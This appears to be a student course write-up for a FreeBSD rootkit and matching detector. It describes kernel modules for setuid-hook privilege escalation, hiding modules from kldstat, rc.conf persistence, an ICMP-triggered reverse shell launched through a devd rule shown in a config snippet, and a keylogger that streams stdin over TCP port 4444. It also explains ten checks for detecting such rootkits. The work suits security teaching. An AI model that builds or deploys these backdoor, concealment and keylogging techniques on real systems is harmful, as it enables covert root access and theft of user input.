# R00TB33R

## Installation

The install script first compiles our kernel modules (elevate, remote, log, ghost) to .ko files. It then setup persistence for the modules and load them with kldload. Next it compiles utility binaries (elevate, bhclient, remote-helper, log, log-helper). The bhclient, log and log-helper utility are copied over to /sbin directory to add to PATH. We then add a devd matching rule which allows our kernel to send a signal to startup a userland script. This allows the remote KLD to initiate a reverse shell back to the sender when it received an ICMP request. Additionally, the install script also carry out other miscellaneous task such as checking that tools are compiled properly and cleaning up the directory after installation to hide files.

DESIGN JUSTIFICATIONS:

Our install scripts compiles the tool for robustness and portability. It's also responsible for setting up any configurations on the kernel for persistence or remote functionality as it's the first tool that will be run on the target machine.

## Escalation

To escalate privilege, our detector hooked the setuid() syscall and intercepts any syscall from a process with the name elevate which requests for the uid 0x1337. It gives this process uid 0. The elevate.c binary is responsible for calling this syscall. Once it has obtained root privilege, it calls /bin/sh to pop a root shell. We chose setuid() as our hook as it's already carrying out change of uid operation. We think this can make the privilege escalation operation more stealthy.

## Concealment

We continue to use the KLD hiding technique from our midpoint. The hiding logic was extracted to ghost-kld.c module. The module is responsible for unlinking our rootkit kernel modules from the linker_files and modules list. It does this by iterating through the link list structure and removing any entries that match our list of kernel rootkit modules. This module is installed last by the install script so that every other previous module including itself are removed.

DESIGN JUSTIFICATIONS:

This concealment technique hides our rootkit KLDs from utility such as kldstat. The reason why we didn't implement other concealment techniques was because we realised that our syscall hooks will be detected by most detectors, as a result implementing other concealment techniques could be useless and so we devoted our time to the detector and other bonus features instead.

## Persistence

*New after midpoint

For persistence, we copy each kernel module to /boot/modules. We then add each module to kld_list in rc.conf so that the kernel are automatically loaded after boot. However, this technique comes at a cost as our rootkit can be easily detected by reading the /etc/rc.conf file.

DESIGN JUSTIFICATIONS:

We considered that this technique is realistic for the timeframe that we have.

## Detection
`detect` exits with `0` on a clean system and `1` when a rootkit is detected. 
Because false positives are penalised, we prioritised surefire methods of rootkit 
detection: a check only contributes to an exit `1` verdict when it is a near-certain
rootkit signature.

### Core design: kernel function-pointer validation

Our core design focuses on kernel function-pointer validation. After reading
through each team's design specifications, we saw common methods in syscall
hooks, ICMP hooks and sysctl hijacks. These all require changing a function
pointer within a kernel dispatch table so that an unauthorised function is
called instead of an approved kernel one. Thus, for every pointer we can reach,
we check whether it lands inside the kernel's own code or inside a currently
loaded module's code, in which case it is legitimate. Any other location is
deemed a sign of a rootkit.

We do this by traversing the `kldstat` listing to build a module map, noting
each loaded file's address and `address + size` range (and whether that range
is the kernel itself). Every pointer we examine is then allocated to one of
three categories:

1. **Kernel/module owned** — the pointer lands in the kernel or in a module that
   `kldstat` currently reports. This is a legitimate pointer.
2. **Owner hidden** — the pointer points into executable memory that falls
   inside no `kldstat`-visible range. This is the strongest signal of a rootkit: code
   is resident in kernel memory that is hidden from the module listing, which is
   exactly the DKOM signature of a module that has unlinked itself from the
   kernel's loaded-module list while still actively hooking the kernel.
3. **Owner null** — an empty (null) pointer, e.g. an unused table slot.

A key consequence of this design is that the detector needs nothing
pre-installed on the target. It reasons purely about where pointers
land relative to the live module map.

### How we read kernel memory

`kcheck` is a userland program, linked against `libkvm`, that reads kernel
memory and performs a series of checks to determine whether a rootkit is
present. It resolves kernel symbols (`sysent`, `linker_files`, `allproc`,
`ip_protox`, ...) with `kvm_nlist` and reads their contents from live kernel
memory via `/dev/kmem`. Running as root at the default secure level which is
fully readable. We chose a userland `libkvm` engine rather than a loadable
kernel module specifically so that the detector requires no installation on the
target and cannot itself be subverted as easily as a loaded `.ko`. If kvm
cannot be opened `kcheck` returns a distinct "engine unavailable" exit code
rather than guessing, so a blocked engine is never silently reported as "clean."
`detect` itself compiles the check sources at run time, so the whole detector 
ships as source and builds against the FreeBSD base system. `kcheck` builds 
the module map and opens kvm once, then runs every check in sequence.

### Ten checks

1. **`sysent` — syscall table hooks.** We read the `sysent` array and classify
   every `sy_call` pointer as above. This finds rootkits that hook syscalls to
   escalate privilege or hide themselves. A pointer into hidden memory is sign
   of a rootkit. A pointer into a visible module is a sign of a rootkit only 
   when it sits at a slot the base kernel owns (`read`, `setuid`, `execve`,
   `getdirentries`, ...). A non-base slot pointing into a visible module is
   deliberately ignored, because legitimate modules are allowed to register
   their own new syscalls. Flagging these would be a false positive.
2. **`ip_protox` — IP protocol backdoors.** Like `sysent`, we traverse the
   `ip_protox` array and identify input handlers that resolve into hidden or
   non-kernel memory like an IP-layer packet backdoor.
3. **`icmp_hook` — ICMP handler redirection.** A targeted check that compares
   `ip_protox[IPPROTO_ICMP]` directly against the resolved address of
   `icmp_input` and flags any irregularities. This is the direct counter to a
   covert channel driven through crafted ICMP packets.
4. **`sysctl` — sysctl handler hijack.** We walk the `sysctl` OID tree
   rather than an array as above, and validate every node's `oid_handler`.
   The walk is bounded so a corrupted or cyclic tree causes the check to skip
   cleanly rather than hang.
5. **`cdevsw` — character-device backdoors.** We inspect every character-device
   driver's operation handlers (`open`, `read`, `write`, `ioctl`, `mmap`, ...)
   and flag any that point into hidden memory. This covers `/dev` backdoors
   such as the keylogger's `/dev/sys_monitor` device.
6. **`pfil` — packet-filter hooks.** Checks packet-filtering hooks that link to
   hidden code. A hook into a visible module is flagged only when that module
   is not a known stock packet filter (`pf`, `ipfw`, `ipl`, `siftr`) which are
   the kld filenames the attacker can't control, so legitimate firewalls never
   trip the check.
7. **`inline` — prologue patches.** For rootkits that patch kernel code
   directly instead of the dispatch table, we read the prologue bytes of a
   curated list of commonly-patched functions and flag a prologue that jumps out
   of kernel text into hidden or non-kernel memory. This is kept as a
   corroborating check because legitimate runtime patching can exist.
8. **`modlist` — DKOM module-list desync.** We walk the kernel's `linker_files`
   list directly through kvm and cross-check it against the `kldstat`-visible
   set by address range. Any linker file in one view but not the other means the
   module listing has been changed. To defeat a rootkit that presents a
   momentarily consistent map, the comparison is repeated and only a mismatch
   that persists across every re-read is reported.
9. **`proc` — DKOM process hiding.** We build three independent views of the
   live process set: the `allproc` list, the parent/child process tree, and the
   `pidhashtbl` hash. We report any process that appears in the tree or the
   hash but is missing from `allproc`. That means a process unlinked from `allproc`
   to hide it from `ps`/`top`. Like `modlist`, it re-snapshots to avoid racing a
   fork/exit and checks each process again so a layout mismatch skips rather
   than resulting in a false positive.
10. **`bootcfg` — persistence.** The one userland check: it parses
    `/boot/loader.conf*`, `/etc/rc.conf*` and their `.d` directories to list
    every module configured to load at boot, then cross-references each against
    the `kldstat` listing.  This catches a module that resolves via
    `kldfind`/`modfind` but is filtered out of the listing, or one staged to
    load but not actually loaded or visible.

## Remote

*New after midpoint

To implement root remote access, our rootkit relies on 4 different components, the remote KLD (remote-kld.c), the bhclient.c binary, the remote shell script and the remote-helper.c binary. The remote KLD is responsible for hooking the icmp_input hook in the ip_protox table. This diverts any received ICMP packets to our hooked function. The hook function then analyse if the ICMP packet is an ECHO request coming from our remote machine's IP address. If it is, it uses devctl_notify() to send an event to the devd daemon.

This is where our second component, the bhclient binary comes in. The bhclient binary is a binary that initiates a reverse shell connection to a given IP address. It is installed in path at /sbin by the install script. When the remote KLD sends an event to the devd daemon, a rules was configured to capture that event and call our bhclient binary. Because devd has root privilege, any process started by it also have root privilege. As a result, the reverse shell provides root privilege to the remote system.

```
  cat <<EOF > /usr/local/etc/devd/devd.conf
notify 100 {
  match "system" "DHCLIENT";
  match "subsystem" "WORKER";
  match "type" "START";
  action "/sbin/bhclient ${1}";
};
EOF
```

The remote-helper.c binary will be used by the remote system to initiate the reverse shell from our target system. It first sends an ICMP ECHO request to the target system. This triggers our remote KLD on the target system, which sends an event via devd and launch the reverse shell bhclient. The remote-helper.c file then sets up a listening port and pass data back and forth between stdin and stdout and the socket. This effectively emulates a shell on the target system.

Finally, the remote shell script is a wrapper that compiles the remote-helper.c file and call it. This effectively starts our chain of events.

DESIGN JUSTIFICATIONS:

For the remote functionality, we chose to hook the ICMP handler as we don't have to setup any listening TCP port which makes our rootkit more stealthy. We chose to use devd to initiates the reverse shell as it's a safe way for the kernel to start a user process. It also provides us with root functionality.

## Keylogger

Our keylogger captures stdin on the target through a KLD and streams those bytes over TCP to a collector/listener (./log <IP>) running on $REMOTE. The kernel module hooks SYS_read and filters for stdin so normal interactive shell input is captured while prompts reading directly from /dev/tty (such as password prompts) are excluded—avoiding the extra detection surface that hooking /dev/tty or broader I/O paths would introduce. We also didn't implement this due to time constraints.

Synchronized Ring Buffer: Bytes copied from user space via copyin() are pushed into ring_buffer under a kernel mutex (ring_mtx). When the buffer is full, incoming bytes are dropped rather than overwriting unread data or overflowing the buffer. monitor_cdevsw serves the buffered data to user space: monitor_read() drains ring_buffer into a staging buffer while holding ring_mtx, then transfers data to user space via uiomove() after releasing the lock so it never sleeps or faults while holding the mutex.

On $TARGET, /sbin/log opens /dev/sys_monitor, connects outbound over TCP to port 4444 (10.0.2.2:4444 under QEMU user-mode networking, and will retry on failure by reconnecting if the socket drops), and forwards [sys_monitor] bytes to the listener. On $REMOTE, ./log <IP> binds TCP port 4444, accepts incoming connections, and writes received bytes to stdout.

### Testing Notes

Start ./log 127.0.0.1 (or ./log 0.0.0.0) on $REMOTE so it is listening on port 4444. Note that the first character typed into QEMU once the connection is established may be missed—typing that initial character triggers/completes the connection path before subsequent stdin reads stream through cleanly.

### Video

Here you can access a video of our keylogger [keyloggerexamplevideo](https://unsw-my.sharepoint.com/:v:/g/personal/z5479498_ad_unsw_edu_au/IQCIgvlaQW5yTK6CTDq4vyO2ASx2TFb6URFLjao2ejlRum4?nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D&e=zRmkqF)
